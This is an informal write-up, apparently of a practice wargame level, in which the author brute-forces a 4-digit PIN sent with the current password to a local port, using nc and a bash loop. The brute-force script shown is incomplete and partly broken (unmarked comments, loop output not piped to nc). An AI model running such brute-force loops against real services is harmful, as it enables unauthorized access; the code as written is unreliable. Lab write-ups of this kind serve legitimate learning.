In this we have to burte force there is a listen on a port we had to connect to eat and give it the current pass and a random 4-digit number so i used bash-scripte to sovle it.

"#!/bin/bash
1. this one connect us to the port
nc localhost xxxxx
2. this one is a for loop to continue trying till it finds the correct digits
for i in $(seq 1 10000); do
    echo "xxxxxxxxxxxxxxxxxxxxxxxxxxx  $i"
done